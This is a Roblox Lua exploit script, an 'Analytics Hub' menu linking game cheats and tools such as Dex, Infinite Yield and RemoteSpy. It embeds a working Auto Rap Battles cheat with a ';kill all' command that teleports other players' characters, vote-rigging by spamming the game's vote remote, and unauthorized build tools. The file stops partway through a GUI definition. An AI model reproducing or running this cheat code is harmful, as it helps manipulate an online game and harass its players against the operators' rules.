local function loadAnalytics() 
	--// Instances
	
	local AnalyticsHub = Instance.new("ScreenGui")
	local Main = Instance.new("Frame")
	local LoadingImage = Instance.new("ImageLabel")
	local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
	local LoadingText = Instance.new("TextLabel")
	
	--// Properties
	
	AnalyticsHub.Name = "AnalyticsHubLoading"
	AnalyticsHub.Parent = game.CoreGui
	
	Main.Name = "Main"
	Main.Parent = AnalyticsHub
	Main.AnchorPoint = Vector2.new(0.5, 0.5)
	Main.BackgroundColor3 = Color3.new(1, 1, 1)
	Main.BackgroundTransparency = 1
	Main.BorderSizePixel = 0
	Main.Position = UDim2.new(0.5, 0, 0.5, 0)
	Main.Size = UDim2.new(1, 0, 1, 0)
	
	LoadingImage.Name = "LoadingImage"
	LoadingImage.Parent = Main
	LoadingImage.AnchorPoint = Vector2.new(0.5, 0.5)
	LoadingImage.BackgroundColor3 = Color3.new(1, 1, 1)
	LoadingImage.BackgroundTransparency = 1
	LoadingImage.BorderSizePixel = 0
	LoadingImage.Position = UDim2.new(0.5, 0, 0, 0)
	LoadingImage.Size = UDim2.new(0.230000004, 0, 0.300000012, 0)
	LoadingImage.Image = "rbxassetid://2711800036"
	LoadingImage.ImageColor3 = Color3.new(0.862745, 0, 0)
	
	UIAspectRatioConstraint.Parent = Main
	UIAspectRatioConstraint.AspectRatio = 1.3200000524521
	
	LoadingText.Name = "LoadingText"
	LoadingText.Parent = Main
	LoadingText.AnchorPoint = Vector2.new(0.5, 0.5)
	LoadingText.BackgroundColor3 = Color3.new(0.862745, 0, 0)
	LoadingText.BorderSizePixel = 0
	LoadingText.Position = UDim2.new(0.5, 0, 0, 0)
	LoadingText.Size = UDim2.new(0.200000003, 0, 0.0500000007, 0)
	LoadingText.Font = Enum.Font.SourceSansLight
	LoadingText.Text = "Analytics Hub"
	LoadingText.TextColor3 = Color3.new(1, 1, 1)
	LoadingText.TextScaled = true
	LoadingText.TextSize = 14
	LoadingText.TextWrapped = true
	
	--// Scripts
	
	LoadingImage:TweenPosition(UDim2.new(0.5, 0,0.5, 0), "Out", "Quint", 1.7)
	LoadingText:TweenPosition(UDim2.new(0.5, 0,0.68, 0), "Out", "Quint", 1.7)
	
	wait(2)
	
	AnalyticsHub:Destroy()
end

local function startAnalytics()
--// Instances

local AnalyticsHub = Instance.new("ScreenGui")
local Main = Instance.new("Frame")
local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
local TitleBar = Instance.new("TextLabel")
local HoldingArea = Instance.new("Frame")
local UIGridLayout = Instance.new("UIGridLayout")
local HomeBtn = Instance.new("TextButton")
local GameScriptsBtn = Instance.new("TextButton")
local ExtraScriptsBtn = Instance.new("TextButton")
local UIAspectRatioConstraint_2 = Instance.new("UIAspectRatioConstraint")
local HomeFrame = Instance.new("Frame")
local UIAspectRatioConstraint_3 = Instance.new("UIAspectRatioConstraint")
local InfoLabel = Instance.new("TextLabel")
local GamesFrame = Instance.new("Frame")
local UIAspectRatioConstraint_4 = Instance.new("UIAspectRatioConstraint")
local UIGridLayout_2 = Instance.new("UIGridLayout")
local BoogaBoogaBtn = Instance.new("TextButton")
local RBBtn = Instance.new("TextButton")
local SnowmanSimBtn = Instance.new("TextButton")
local AutoRapBattlesBtn = Instance.new("TextButton")
local LxBtn = Instance.new("TextButton")
local MiniBtn = Instance.new("ImageButton")
local ExtrasFrame = Instance.new("Frame")
local UIAspectRatioConstraint_5 = Instance.new("UIAspectRatioConstraint")
local UIGridLayout_3 = Instance.new("UIGridLayout")
local DexV4Btn = Instance.new("TextButton")
local IYBtn = Instance.new("TextButton")
local DexV2Btn = Instance.new("TextButton")
local ShattervastBtn = Instance.new("TextButton")
local HeadspinBtn = Instance.new("TextButton")
local ChatTrollBtn = Instance.new("TextButton")
local RemotespyBtn = Instance.new("TextButton")

--// Properties

AnalyticsHub.Name = "AnalyticsHub"
AnalyticsHub.Parent = game.CoreGui

Main.Name = "Main"
Main.Parent = AnalyticsHub
Main.AnchorPoint = Vector2.new(0.5, 0.5)
Main.BackgroundColor3 = Color3.new(0.937255, 0.937255, 0.937255)
Main.BorderSizePixel = 0
Main.Position = UDim2.new(0.5, 0, 0.309582323, 0)
Main.Size = UDim2.new(0.300000012, 0, 0.0142506044, 0)
Main.Active = true
Main.Draggable = true

UIAspectRatioConstraint.Parent = Main

TitleBar.Name = "TitleBar"
TitleBar.Parent = Main
TitleBar.BackgroundColor3 = Color3.new(1, 1, 1)
TitleBar.BorderSizePixel = 0
TitleBar.Size = UDim2.new(1, 0, 0.100000001, 0)
TitleBar.Font = Enum.Font.SourceSansLight
TitleBar.Text = "Analytics Hub"
TitleBar.TextColor3 = Color3.new(1, 0, 0)
TitleBar.TextScaled = true
TitleBar.TextSize = 14
TitleBar.TextWrapped = true

HoldingArea.Name = "HoldingArea"
HoldingArea.Parent = Main
HoldingArea.BackgroundColor3 = Color3.new(1, 1, 1)
HoldingArea.BackgroundTransparency = 1
HoldingArea.BorderSizePixel = 0
HoldingArea.Position = UDim2.new(0, 0, 0.0999999642, 0)
HoldingArea.Size = UDim2.new(1, 0, 0.900000095, 0)

UIGridLayout.Parent = HoldingArea
UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIGridLayout.CellPadding = UDim2.new(0, 0, 0, 0)
UIGridLayout.CellSize = UDim2.new(0.333400011, 0, 0.100000001, 0)

HomeBtn.Name = "HomeBtn"
HomeBtn.Parent = HoldingArea
HomeBtn.BackgroundColor3 = Color3.new(1, 1, 1)
HomeBtn.BorderSizePixel = 0
HomeBtn.Size = UDim2.new(0, 200, 0, 50)
HomeBtn.Font = Enum.Font.SourceSansItalic
HomeBtn.Text = "Home"
HomeBtn.TextColor3 = Color3.new(1, 0, 0)
HomeBtn.TextScaled = true
HomeBtn.TextSize = 14
HomeBtn.TextWrapped = true

GameScriptsBtn.Name = "GameScriptsBtn"
GameScriptsBtn.Parent = HoldingArea
GameScriptsBtn.BackgroundColor3 = Color3.new(1, 1, 1)
GameScriptsBtn.BorderSizePixel = 0
GameScriptsBtn.LayoutOrder = 1
GameScriptsBtn.Size = UDim2.new(0, 200, 0, 50)
GameScriptsBtn.Font = Enum.Font.SourceSansItalic
GameScriptsBtn.Text = "Games"
GameScriptsBtn.TextColor3 = Color3.new(1, 0, 0)
GameScriptsBtn.TextScaled = true
GameScriptsBtn.TextSize = 14
GameScriptsBtn.TextWrapped = true

ExtraScriptsBtn.Name = "ExtraScriptsBtn"
ExtraScriptsBtn.Parent = HoldingArea
ExtraScriptsBtn.BackgroundColor3 = Color3.new(1, 1, 1)
ExtraScriptsBtn.BorderSizePixel = 0
ExtraScriptsBtn.LayoutOrder = 3
ExtraScriptsBtn.Size = UDim2.new(0, 200, 0, 50)
ExtraScriptsBtn.Font = Enum.Font.SourceSansItalic
ExtraScriptsBtn.Text = "Extras"
ExtraScriptsBtn.TextColor3 = Color3.new(1, 0, 0)
ExtraScriptsBtn.TextScaled = true
ExtraScriptsBtn.TextSize = 14
ExtraScriptsBtn.TextWrapped = true

UIAspectRatioConstraint_2.Parent = HoldingArea
UIAspectRatioConstraint_2.AspectRatio = 1.1200000047684

HomeFrame.Name = "HomeFrame"
HomeFrame.Parent = Main
HomeFrame.BackgroundColor3 = Color3.new(1, 1, 1)
HomeFrame.BackgroundTransparency = 1
HomeFrame.BorderSizePixel = 0
HomeFrame.Position = UDim2.new(0, 0, 0.190090016, 0)
HomeFrame.Size = UDim2.new(1, 0, 0.809909821, 0)

UIAspectRatioConstraint_3.Parent = HomeFrame
UIAspectRatioConstraint_3.AspectRatio = 1.2389999628067

InfoLabel.Name = "InfoLabel"
InfoLabel.Parent = HomeFrame
InfoLabel.AnchorPoint = Vector2.new(0.5, 0.5)
InfoLabel.BackgroundColor3 = Color3.new(1, 1, 1)
InfoLabel.BackgroundTransparency = 1
InfoLabel.BorderSizePixel = 0
InfoLabel.Position = UDim2.new(0.5, 0, 0.449999988, 0)
InfoLabel.Size = UDim2.new(1, 0, 0.300000012, 0)
InfoLabel.Font = Enum.Font.Gotham
InfoLabel.Text = "Thank you for using CriShoux's Analytics Hub!"
InfoLabel.TextColor3 = Color3.new(1, 0, 0)
InfoLabel.TextScaled = true
InfoLabel.TextSize = 14
InfoLabel.TextWrapped = true

GamesFrame.Name = "GamesFrame"
GamesFrame.Parent = Main
GamesFrame.BackgroundColor3 = Color3.new(1, 1, 1)
GamesFrame.BackgroundTransparency = 1
GamesFrame.BorderSizePixel = 0
GamesFrame.Position = UDim2.new(0, 0, 0.189999998, 0)
GamesFrame.Size = UDim2.new(1, 0, 0.810000002, 0)
GamesFrame.Visible = false

UIAspectRatioConstraint_4.Parent = GamesFrame
UIAspectRatioConstraint_4.AspectRatio = 1.2389999628067

UIGridLayout_2.Parent = GamesFrame
UIGridLayout_2.CellPadding = UDim2.new(0.00999999978, 0, 0.00999999978, 0)
UIGridLayout_2.CellSize = UDim2.new(0.326000005, 0, 0.119999997, 0)

BoogaBoogaBtn.Name = "BoogaBoogaBtn"
BoogaBoogaBtn.Parent = GamesFrame
BoogaBoogaBtn.BackgroundColor3 = Color3.new(1, 1, 1)
BoogaBoogaBtn.BorderSizePixel = 0
BoogaBoogaBtn.Position = UDim2.new(0.37624377, 0, 0.443050325, 0)
BoogaBoogaBtn.Size = UDim2.new(0, 200, 0, 50)
BoogaBoogaBtn.Font = Enum.Font.SourceSansLight
BoogaBoogaBtn.Text = "Booga Booga"
BoogaBoogaBtn.TextColor3 = Color3.new(1, 0, 0)
BoogaBoogaBtn.TextScaled = true
BoogaBoogaBtn.TextSize = 14
BoogaBoogaBtn.TextWrapped = true

RBBtn.Name = "RBBtn"
RBBtn.Parent = GamesFrame
RBBtn.BackgroundColor3 = Color3.new(1, 1, 1)
RBBtn.BorderSizePixel = 0
RBBtn.Position = UDim2.new(0.37624377, 0, 0.443050325, 0)
RBBtn.Size = UDim2.new(0, 200, 0, 50)
RBBtn.Font = Enum.Font.SourceSansLight
RBBtn.Text = "RB World 2"
RBBtn.TextColor3 = Color3.new(1, 0, 0)
RBBtn.TextScaled = true
RBBtn.TextSize = 14
RBBtn.TextWrapped = true

SnowmanSimBtn.Name = "SnowmanSimBtn"
SnowmanSimBtn.Parent = GamesFrame
SnowmanSimBtn.BackgroundColor3 = Color3.new(1, 1, 1)
SnowmanSimBtn.BorderSizePixel = 0
SnowmanSimBtn.Position = UDim2.new(0.37624377, 0, 0.443050325, 0)
SnowmanSimBtn.Size = UDim2.new(0, 200, 0, 50)
SnowmanSimBtn.Font = Enum.Font.SourceSansLight
SnowmanSimBtn.Text = "Snowman Simulator"
SnowmanSimBtn.TextColor3 = Color3.new(1, 0, 0)
SnowmanSimBtn.TextScaled = true
SnowmanSimBtn.TextSize = 14
SnowmanSimBtn.TextWrapped = true

AutoRapBattlesBtn.Name = "AutoRapBattlesBtn"
AutoRapBattlesBtn.Parent = GamesFrame
AutoRapBattlesBtn.BackgroundColor3 = Color3.new(1, 1, 1)
AutoRapBattlesBtn.BorderSizePixel = 0
AutoRapBattlesBtn.Position = UDim2.new(0.37624377, 0, 0.443050325, 0)
AutoRapBattlesBtn.Size = UDim2.new(0, 200, 0, 50)
AutoRapBattlesBtn.Font = Enum.Font.SourceSansLight
AutoRapBattlesBtn.Text = "AutoRapBattles"
AutoRapBattlesBtn.TextColor3 = Color3.new(1, 0, 0)
AutoRapBattlesBtn.TextScaled = true
AutoRapBattlesBtn.TextSize = 14
AutoRapBattlesBtn.TextWrapped = true

LxBtn.Name = "LxBtn"
LxBtn.Parent = GamesFrame
LxBtn.BackgroundColor3 = Color3.new(1, 1, 1)
LxBtn.BorderSizePixel = 0
LxBtn.Position = UDim2.new(0.37624377, 0, 0.443050325, 0)
LxBtn.Size = UDim2.new(0, 200, 0, 50)
LxBtn.Font = Enum.Font.SourceSansLight
LxBtn.Text = "Phantom Forces Lx 4.0"
LxBtn.TextColor3 = Color3.new(1, 0, 0)
LxBtn.TextScaled = true
LxBtn.TextSize = 14
LxBtn.TextWrapped = true

MiniBtn.Name = "MiniBtn"
MiniBtn.Parent = Main
MiniBtn.AnchorPoint = Vector2.new(1, 0)
MiniBtn.BackgroundColor3 = Color3.new(1, 1, 1)
MiniBtn.BackgroundTransparency = 1
MiniBtn.BorderSizePixel = 0
MiniBtn.Position = UDim2.new(1, 0, 0, 0)
MiniBtn.Size = UDim2.new(0.0900000036, 0, 0.0900000036, 0)
MiniBtn.Image = "rbxassetid://2711800026"
MiniBtn.ImageColor3 = Color3.new(1, 0, 0)

ExtrasFrame.Name = "ExtrasFrame"
ExtrasFrame.Parent = Main
ExtrasFrame.BackgroundColor3 = Color3.new(1, 1, 1)
ExtrasFrame.BackgroundTransparency = 1
ExtrasFrame.BorderSizePixel = 0
ExtrasFrame.Position = UDim2.new(0, 0, 0.189999998, 0)
ExtrasFrame.Size = UDim2.new(1, 0, 0.810000002, 0)
ExtrasFrame.Visible = false

UIAspectRatioConstraint_5.Parent = ExtrasFrame
UIAspectRatioConstraint_5.AspectRatio = 1.2389999628067

UIGridLayout_3.Parent = ExtrasFrame
UIGridLayout_3.CellPadding = UDim2.new(0.00999999978, 0, 0.00999999978, 0)
UIGridLayout_3.CellSize = UDim2.new(0.326000005, 0, 0.119999997, 0)

DexV4Btn.Name = "DexV4Btn"
DexV4Btn.Parent = ExtrasFrame
DexV4Btn.BackgroundColor3 = Color3.new(1, 1, 1)
DexV4Btn.BorderSizePixel = 0
DexV4Btn.Size = UDim2.new(0, 200, 0, 50)
DexV4Btn.Font = Enum.Font.SourceSansLight
DexV4Btn.Text = "Dex V4"
DexV4Btn.TextColor3 = Color3.new(1, 0, 0)
DexV4Btn.TextScaled = true
DexV4Btn.TextSize = 14
DexV4Btn.TextWrapped = true

IYBtn.Name = "IYBtn"
IYBtn.Parent = ExtrasFrame
IYBtn.BackgroundColor3 = Color3.new(1, 1, 1)
IYBtn.BorderSizePixel = 0
IYBtn.Size = UDim2.new(0, 200, 0, 50)
IYBtn.Font = Enum.Font.SourceSansLight
IYBtn.Text = "Infinite Yield FE"
IYBtn.TextColor3 = Color3.new(1, 0, 0)
IYBtn.TextScaled = true
IYBtn.TextSize = 14
IYBtn.TextWrapped = true

DexV2Btn.Name = "DexV2Btn"
DexV2Btn.Parent = ExtrasFrame
DexV2Btn.BackgroundColor3 = Color3.new(1, 1, 1)
DexV2Btn.BorderSizePixel = 0
DexV2Btn.Size = UDim2.new(0, 200, 0, 50)
DexV2Btn.Font = Enum.Font.SourceSansLight
DexV2Btn.Text = "Dex V2"
DexV2Btn.TextColor3 = Color3.new(1, 0, 0)
DexV2Btn.TextScaled = true
DexV2Btn.TextSize = 14
DexV2Btn.TextWrapped = true

ShattervastBtn.Name = "ShattervastBtn"
ShattervastBtn.Parent = ExtrasFrame
ShattervastBtn.BackgroundColor3 = Color3.new(1, 1, 1)
ShattervastBtn.BorderSizePixel = 0
ShattervastBtn.Size = UDim2.new(0, 200, 0, 50)
ShattervastBtn.Font = Enum.Font.SourceSansLight
ShattervastBtn.Text = "Shattervast"
ShattervastBtn.TextColor3 = Color3.new(1, 0, 0)
ShattervastBtn.TextScaled = true
ShattervastBtn.TextSize = 14
ShattervastBtn.TextWrapped = true

HeadspinBtn.Name = "HeadspinBtn"
HeadspinBtn.Parent = ExtrasFrame
HeadspinBtn.BackgroundColor3 = Color3.new(1, 1, 1)
HeadspinBtn.BorderSizePixel = 0
HeadspinBtn.Size = UDim2.new(0, 200, 0, 50)
HeadspinBtn.Font = Enum.Font.SourceSansLight
HeadspinBtn.Text = "Headspin"
HeadspinBtn.TextColor3 = Color3.new(1, 0, 0)
HeadspinBtn.TextScaled = true
HeadspinBtn.TextSize = 14
HeadspinBtn.TextWrapped = true

ChatTrollBtn.Name = "ChatTrollBtn"
ChatTrollBtn.Parent = ExtrasFrame
ChatTrollBtn.BackgroundColor3 = Color3.new(1, 1, 1)
ChatTrollBtn.BorderSizePixel = 0
ChatTrollBtn.Size = UDim2.new(0, 200, 0, 50)
ChatTrollBtn.Font = Enum.Font.SourceSansLight
ChatTrollBtn.Text = "Chat Troll"
ChatTrollBtn.TextColor3 = Color3.new(1, 0, 0)
ChatTrollBtn.TextScaled = true
ChatTrollBtn.TextSize = 14
ChatTrollBtn.TextWrapped = true

RemotespyBtn.Name = "RemotespyBtn"
RemotespyBtn.Parent = ExtrasFrame
RemotespyBtn.BackgroundColor3 = Color3.new(1, 1, 1)
RemotespyBtn.BorderSizePixel = 0
RemotespyBtn.Size = UDim2.new(0, 200, 0, 50)
RemotespyBtn.Font = Enum.Font.SourceSansLight
RemotespyBtn.Text = "RemoteSpy"
RemotespyBtn.TextColor3 = Color3.new(1, 0, 0)
RemotespyBtn.TextScaled = true
RemotespyBtn.TextSize = 14
RemotespyBtn.TextWrapped = true

--// Scripts

Main:TweenSize(UDim2.new(0.3, 0,0.4, 0), "Out", "Quint", 1)

MiniBtn.MouseButton1Down:Connect(function()
	AnalyticsHub:Destroy()
end)

HomeBtn.MouseButton1Down:Connect(function()
	GamesFrame.Visible = false
	ExtrasFrame.Visible = false
	HomeFrame.Visible = true
end)

GameScriptsBtn.MouseButton1Down:Connect(function()
	GamesFrame.Visible = true
	ExtrasFrame.Visible = false
	HomeFrame.Visible = false
end)

ExtraScriptsBtn.MouseButton1Down:Connect(function()
	GamesFrame.Visible = false
	ExtrasFrame.Visible = true
	HomeFrame.Visible = false
end)

AutoRapBattlesBtn.MouseButton1Down:Connect(function()
	
--Converted with ttyyuu12345's model to script plugin v4
function sandbox(var,func)
	local env = getfenv(func)
	local newenv = setmetatable({},{
		__index = function(self,k)
			if k=="script" then
				return var
			else
				return env[k]
			end
		end,
	})
	setfenv(func,newenv)
	return func
end
cors = {}
mas = Instance.new("Model",game:GetService("Lighting"))
ScreenGui0 = Instance.new("ScreenGui")
Frame1 = Instance.new("Frame")
TextButton2 = Instance.new("TextButton")
Script3 = Instance.new("Script")
Frame4 = Instance.new("Frame")
ScrollingFrame5 = Instance.new("ScrollingFrame")
TextLabel6 = Instance.new("TextLabel")
TextLabel7 = Instance.new("TextLabel")
TextLabel8 = Instance.new("TextLabel")
TextLabel9 = Instance.new("TextLabel")
TextLabel10 = Instance.new("TextLabel")
TextLabel11 = Instance.new("TextLabel")
TextLabel12 = Instance.new("TextLabel")
TextButton13 = Instance.new("TextButton")
Script14 = Instance.new("Script")
LocalScript15 = Instance.new("LocalScript")
Frame16 = Instance.new("Frame")
ScrollingFrame17 = Instance.new("ScrollingFrame")
TextLabel18 = Instance.new("TextLabel")
TextLabel19 = Instance.new("TextLabel")
TextLabel20 = Instance.new("TextLabel")
TextButton21 = Instance.new("TextButton")
Script22 = Instance.new("Script")
ScreenGui0.Name = "Auto shit battles"
ScreenGui0.Parent = mas
Frame1.Name = "TopBar"
Frame1.Parent = ScreenGui0
Frame1.Size = UDim2.new(0, 4701, 0, 36)
Frame1.Style = Enum.FrameStyle.RobloxSquare
Frame1.BackgroundColor3 = Color3.new(1, 1, 1)
TextButton2.Parent = Frame1
TextButton2.Transparency = 0
TextButton2.Size = UDim2.new(0, 37, 0, 32)
TextButton2.Text = "R"
TextButton2.Position = UDim2.new(-0.00170176558, 0, -0.361111104, 0)
TextButton2.BackgroundColor3 = Color3.new(1, 1, 1)
TextButton2.BackgroundTransparency = 1
TextButton2.Font = Enum.Font.SourceSans
TextButton2.FontSize = Enum.FontSize.Size14
TextButton2.TextColor3 = Color3.new(1, 1, 1)
TextButton2.TextScaled = true
TextButton2.TextWrapped = true
Script3.Parent = TextButton2
table.insert(cors,sandbox(Script3,function()
button1 = script.Parent

function click()
				script.Parent.Parent.Parent.CMDS.Active = true
			script.Parent.Parent.Parent.CMDS.Draggable = true
						script.Parent.Parent.Parent.CMDS.Visible = true
end

button1.MouseButton1Down:connect(click)
end))
Frame4.Name = "CMDS"
Frame4.Parent = ScreenGui0
Frame4.Size = UDim2.new(0, 307, 0, 328)
Frame4.Style = Enum.FrameStyle.RobloxSquare
Frame4.Position = UDim2.new(0.0198863633, 0, 0.536645949, 0)
Frame4.Visible = false
Frame4.BackgroundColor3 = Color3.new(1, 1, 1)
ScrollingFrame5.Parent = Frame4
ScrollingFrame5.Size = UDim2.new(0, 294, 0, 282)
ScrollingFrame5.Position = UDim2.new(0, -1, 0.0799999982, 0)
ScrollingFrame5.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)
TextLabel6.Name = "Vote1"
TextLabel6.Parent = ScrollingFrame5
TextLabel6.Transparency = 0
TextLabel6.Size = UDim2.new(0, 116, 0, 15)
TextLabel6.Text = ";kill all"
TextLabel6.Position = UDim2.new(0.0273549147, 0, 0.0116329351, 0)
TextLabel6.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel6.BackgroundTransparency = 1
TextLabel6.Font = Enum.Font.SourceSans
TextLabel6.FontSize = Enum.FontSize.Size14
TextLabel6.TextColor3 = Color3.new(1, 1, 1)
TextLabel6.TextXAlignment = Enum.TextXAlignment.Left
TextLabel7.Name = "Vote1"
TextLabel7.Parent = ScrollingFrame5
TextLabel7.Transparency = 0
TextLabel7.Size = UDim2.new(0, 116, 0, 15)
TextLabel7.Text = ";cmds"
TextLabel7.Position = UDim2.new(0.0273549147, 0, 0.0648244247, 0)
TextLabel7.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel7.BackgroundTransparency = 1
TextLabel7.Font = Enum.Font.SourceSans
TextLabel7.FontSize = Enum.FontSize.Size14
TextLabel7.TextColor3 = Color3.new(1, 1, 1)
TextLabel7.TextXAlignment = Enum.TextXAlignment.Left
TextLabel8.Name = "Vote1"
TextLabel8.Parent = ScrollingFrame5
TextLabel8.Transparency = 0
TextLabel8.Size = UDim2.new(0, 116, 0, 15)
TextLabel8.Text = ";votes"
TextLabel8.Position = UDim2.new(0.0273549147, 0, 0.118015915, 0)
TextLabel8.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel8.BackgroundTransparency = 1
TextLabel8.Font = Enum.Font.SourceSans
TextLabel8.FontSize = Enum.FontSize.Size14
TextLabel8.TextColor3 = Color3.new(1, 1, 1)
TextLabel8.TextXAlignment = Enum.TextXAlignment.Left
TextLabel9.Name = "Vote1"
TextLabel9.Parent = ScrollingFrame5
TextLabel9.Transparency = 0
TextLabel9.Size = UDim2.new(0, 116, 0, 15)
TextLabel9.Text = ";vote 1"
TextLabel9.Position = UDim2.new(0.0273549147, 0, 0.171207398, 0)
TextLabel9.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel9.BackgroundTransparency = 1
TextLabel9.Font = Enum.Font.SourceSans
TextLabel9.FontSize = Enum.FontSize.Size14
TextLabel9.TextColor3 = Color3.new(1, 1, 1)
TextLabel9.TextXAlignment = Enum.TextXAlignment.Left
TextLabel10.Name = "Vote1"
TextLabel10.Parent = ScrollingFrame5
TextLabel10.Transparency = 0
TextLabel10.Size = UDim2.new(0, 116, 0, 15)
TextLabel10.Text = ";vote 2"
TextLabel10.Position = UDim2.new(0.0273549147, 0, 0.224398881, 0)
TextLabel10.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel10.BackgroundTransparency = 1
TextLabel10.Font = Enum.Font.SourceSans
TextLabel10.FontSize = Enum.FontSize.Size14
TextLabel10.TextColor3 = Color3.new(1, 1, 1)
TextLabel10.TextXAlignment = Enum.TextXAlignment.Left
TextLabel11.Name = "Vote1"
TextLabel11.Parent = ScrollingFrame5
TextLabel11.Transparency = 0
TextLabel11.Size = UDim2.new(0, 116, 0, 15)
TextLabel11.Text = ";btools me"
TextLabel11.Position = UDim2.new(0.0273549147, 0, 0.277590364, 0)
TextLabel11.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel11.BackgroundTransparency = 1
TextLabel11.Font = Enum.Font.SourceSans
TextLabel11.FontSize = Enum.FontSize.Size14
TextLabel11.TextColor3 = Color3.new(1, 1, 1)
TextLabel11.TextXAlignment = Enum.TextXAlignment.Left
TextLabel12.Parent = Frame4
TextLabel12.Transparency = 0
TextLabel12.Size = UDim2.new(0, 116, 0, 15)
TextLabel12.Text = "Auto Rap Battles CMDS"
TextLabel12.Position = UDim2.new(-0.00325732911, 0, -0.00609756075, 0)
TextLabel12.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel12.BackgroundTransparency = 1
TextLabel12.Font = Enum.Font.SourceSans
TextLabel12.FontSize = Enum.FontSize.Size14
TextLabel12.TextColor3 = Color3.new(1, 1, 1)
TextLabel12.TextXAlignment = Enum.TextXAlignment.Left
TextButton13.Name = "Close"
TextButton13.Parent = Frame4
TextButton13.Transparency = 0
TextButton13.Size = UDim2.new(0, 20, 0, 17)
TextButton13.Text = "X"
TextButton13.Position = UDim2.new(0.957654715, 0, -0.0121951215, 0)
TextButton13.BackgroundColor3 = Color3.new(1, 1, 1)
TextButton13.BackgroundTransparency = 1
TextButton13.Font = Enum.Font.SourceSans
TextButton13.FontSize = Enum.FontSize.Size14
TextButton13.TextColor3 = Color3.new(1, 1, 1)
TextButton13.TextScaled = true
TextButton13.TextWrapped = true
Script14.Parent = TextButton13
table.insert(cors,sandbox(Script14,function()
button1 = script.Parent

function click()
script.Parent.Parent.Visible = false
end

button1.MouseButton1Down:connect(click)
end))
LocalScript15.Parent = ScreenGui0
table.insert(cors,sandbox(LocalScript15,function()
spawn (function()
--[[
		OnChatted Scripting Template - created by 1WOOF1 

			Use this script to match what a player says 
			and turn it into a command. This does NOT have
			any admin's but if you find a way to make it
			admin only, that is good, also, if you do
			find a way, it would be nice if you PM me
			how you did it!
]]

	game.Players.LocalPlayer.Chatted:connect(function(msg) 
		if (msg:lower() == ";kill all") then --------------- This is a basic "Reset" command.
			  -- https://www.roblox.com/games/579955134/Auto-Rap-Battles
-- Run once, and then easy kill all

NOW = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame
for i,v in pairs(game:GetService("Players"):GetPlayers()) do
if v ~= game:GetService("Players").LocalPlayer then
if v.Character:FindFirstChild("HumanoidRootPart") then
game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-70, 57.5, -216)
pcall(function()
v.Character.Humanoid.Jump = true
end)
v.Character.HumanoidRootPart.CFrame = CFrame.new(-73.5, 61.5, -215)
wait(0.1)
v.Character.HumanoidRootPart.CFrame = CFrame.new(-73.5, 61.5, -215)
end
end
end
game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = NOW
		elseif (msg:lower() == ";votes") then  ---------- This is just a command when you say something, a 

            script.Parent.Votes.Active = true
            script.Parent.Votes.Draggable = true
			script.Parent.Votes.Visible = true
			script.Parent.Votes.ScrollingFrame.Vote1.Text =	"1. " ..game.Workspace.RapBattles.Rappers.player1.Value.. "."
						script.Parent.Votes.ScrollingFrame.Vote2.Text =	"2. " ..game.Workspace.RapBattles.Rappers.player2.Value.. "."

		elseif (msg:lower() == ";cmds") then 

			script.Parent.CMDS.Active = true
			script.Parent.CMDS.Draggable = true
						script.Parent.CMDS.Visible = true

		elseif (msg:lower() == ";btools me") then 

			local StarterGui = game:GetService('StarterGui')
 
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)

a = Instance.new("HopperBin", game.Players.LocalPlayer.Backpack)
a.BinType = 2
b = Instance.new("HopperBin", game.Players.LocalPlayer.Backpack)
b.BinType = 3
c = Instance.new("HopperBin", game.Players.LocalPlayer.Backpack)
c.BinType = 4

		elseif (msg:lower() == ";vote 2") then 

			game.Workspace.Votes:FireServer(false,"p2")
			game.Workspace.Votes:FireServer(false,"p2")
			game.Workspace.Votes:FireServer(false,"p2")
			game.Workspace.Votes:FireServer(false,"p2")
			game.Workspace.Votes:FireServer(false,"p2")
			game.Workspace.Votes:FireServer(false,"p2")
			game.Workspace.Votes:FireServer(false,"p2")
			game.Workspace.Votes:FireServer(false,"p2")
			game.Workspace.Votes:FireServer(false,"p2")
			

		elseif (msg:lower() == ";vote 1") then 

			game.Workspace.Votes:FireServer(false,"p1")
			game.Workspace.Votes:FireServer(false,"p1")
			game.Workspace.Votes:FireServer(false,"p1")
			game.Workspace.Votes:FireServer(false,"p1")
			game.Workspace.Votes:FireServer(false,"p1")
			game.Workspace.Votes:FireServer(false,"p1")
			game.Workspace.Votes:FireServer(false,"p1")
			game.Workspace.Votes:FireServer(false,"p1")
			game.Workspace.Votes:FireServer(false,"p1")
			game.Workspace.Votes:FireServer(false,"p1")
			game.Workspace.Votes:FireServer(false,"p1")
			game.Workspace.Votes:FireServer(false,"p1")
			

		end 
		-- If you run out, just copy and paste more of the line 'elseif (msg:lower() == "") then'
	end) 
end) 
end))
Frame16.Name = "Votes"
Frame16.Parent = ScreenGui0
Frame16.Size = UDim2.new(0, 307, 0, 328)
Frame16.Style = Enum.FrameStyle.RobloxSquare
Frame16.Position = UDim2.new(0.222829342, 0, 0.536645949, 0)
Frame16.Visible = false
Frame16.BackgroundColor3 = Color3.new(1, 1, 1)
ScrollingFrame17.Parent = Frame16
ScrollingFrame17.Size = UDim2.new(0, 294, 0, 282)
ScrollingFrame17.Position = UDim2.new(0, -1, 0.0799999982, 0)
ScrollingFrame17.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)
TextLabel18.Name = "Vote1"
TextLabel18.Parent = ScrollingFrame17
TextLabel18.Transparency = 0
TextLabel18.Size = UDim2.new(0, 116, 0, 15)
TextLabel18.Text = "1."
TextLabel18.Position = UDim2.new(0.0273549147, 0, 0.0116329351, 0)
TextLabel18.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel18.BackgroundTransparency = 1
TextLabel18.Font = Enum.Font.SourceSans
TextLabel18.FontSize = Enum.FontSize.Size14
TextLabel18.TextColor3 = Color3.new(1, 1, 1)
